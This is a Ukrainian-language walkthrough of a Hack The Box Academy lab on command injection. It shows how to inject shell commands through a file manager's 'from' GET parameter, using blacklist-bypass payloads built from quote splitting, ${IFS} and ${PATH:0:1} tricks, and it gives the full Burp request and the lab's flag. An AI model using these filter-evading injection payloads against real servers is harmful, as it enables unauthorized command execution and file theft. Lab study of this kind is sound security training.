## Command Injections — Skills Assessment: File Manager GET Injection

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Skills Assessment](https://academy.hackthebox.com/app/module/109/section/1042)
**Прапор:** `HTB{c0mm4nd3r_1nj3c70r}`

***

## Концепція

Цей таск відрізняється від попереднього: injection не в email-формі, а в **GET-параметрі `from`** файлового менеджера. Сервер використовує параметр `from` для операції переміщення файлу — передає його напряму в shell команду типу `mv $from $to`. Ми підміняємо ім'я файлу на shell injection payload.

**Injection точка:**
```
GET /index.php?to=tmp&from=[INJECTION]&finish=1&move=1
```

Параметр `from` — ім'я файлу-джерела — передається в shell без санітизації.

***

## Крок 1 — Логін і розвідка

```
1. Burp Suite → Proxy → Open Browser
2. Відкриваємо: http://TARGET_IP:PORT
3. Логін: guest / guest
```

***

## Крок 2 — Знаходимо injection точку

```
4. На головній сторінці → натискаємо будь-який файл → "Copy to..."
   → Перекидає на: /index.php?to=&from=FILENAME.txt

5. Вибираємо папку "tmp" → натискаємо "Move"
   → URL стає: /index.php?to=tmp&from=FILENAME.txt&finish=1&move=1
```

> **Навіщо:** Ця URL операція — це і є GET-запит де `from=` передається в shell. Параметр `from` містить ім'я файлу який сервер переміщує — ідеальна injection точка.

***

## Крок 3 — Перехоплюємо запит у Burp

```
6. Burp → Proxy → HTTP History → знаходимо GET запит:
   GET /index.php?to=tmp&from=FILENAME.txt&finish=1&move=1

7. Правий клік → "Send to Repeater" (Ctrl+R)
```

***

## Крок 4 — Будуємо payload

**Проблема:** `from=` очікує ім'я файлу, але ми вставляємо команду. Blacklist може блокувати пробіл і слеш.

**Payload:**
```
;c'a't${IFS}${PATH:0:1}flag.txt;
```

| Частина | Що означає |
|---|---|
| `;` на початку | Injection operator — завершує попередню команду `mv` |
| `c'a't` | `cat` з лапками — обходить blacklist слова `cat` |
| `${IFS}` | Internal Field Separator = пробіл — обходить blacklist пробілу |
| `${PATH:0:1}` | Перший символ `$PATH` = `/` — обходить blacklist слешу |
| `flag.txt` | Цільовий файл |
| `;` в кінці | Закриває нашу команду, щоб решта запиту не ламала shell |
| **Shell виконує:** | `mv ...; cat /flag.txt; ...` |

> **Якщо `/flag.txt` не знайдено** — використовуємо path traversal через кілька `..${PATH:0:1}`:

```
;c'a't${IFS}${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt;
```

***

## Крок 5 — Відправляємо в Burp Repeater

У Repeater замінюємо рядок запиту:

```http
GET /index.php?to=tmp&from=%3bc'a't${IFS}${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt;&finish=1&move=1 HTTP/1.1
Host: 154.57.164.82:30617
Cookie: filemanager=SESSION_COOKIE
Connection: keep-alive
```

> **Важливо:** `;` URL-encoded = `%3b`. Перший `;` — `%3b`, закриваючий `;` можна залишити як є або теж закодувати.

**Send** → у вкладці **Response** шукаємо:

```
HTB{c0mm4nd3r_1nj3c70r}
```
## Чому GET, а не POST?

```
File Manager операції (move/copy) використовують GET запити з параметрами в URL:
/index.php?to=DEST&from=SOURCE&finish=1&move=1

Сервер виконує щось на кшталт:
shell_exec("mv uploads/$from $to/");

Якщо $from не санітизований → ми вставляємо ; і виконуємо довільну команду
```

***

## Схема атаки

```
[Браузер/curl]
GET /index.php?to=tmp&from=;c'a't${IFS}${PATH:0:1}flag.txt;&finish=1&move=1
                                  ↓
[Сервер PHP]
$from = ";c'a't${IFS}${PATH:0:1}flag.txt;"
shell_exec("mv uploads/" . $from . " tmp/")
                                  ↓
[Shell виконує]
mv uploads/ ; cat /flag.txt ; tmp/
              ↑↑↑↑↑↑↑↑↑↑↑↑
              наша команда
                                  ↓
[Response містить]
HTB{c0mm4nd3r_1nj3c70r}
```

***

## Прапор

```
HTB{c0mm4nd3r_1nj3c70r}
```
